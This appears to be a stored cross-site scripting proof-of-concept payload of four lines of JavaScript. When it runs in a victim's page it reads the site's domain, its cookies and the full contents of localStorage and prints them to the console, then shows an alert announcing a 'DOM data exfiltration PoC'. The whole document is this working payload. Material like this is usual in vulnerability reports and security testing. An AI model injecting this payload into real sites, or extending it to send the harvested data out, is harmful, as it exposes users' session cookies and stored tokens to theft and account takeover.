console.log("Stored XSS PoC on " + document.domain);
console.log("Cookies:", document.cookie);
console.log("LocalStorage:", JSON.stringify(localStorage));
alert("Check the console for DOM data exfiltration PoC");
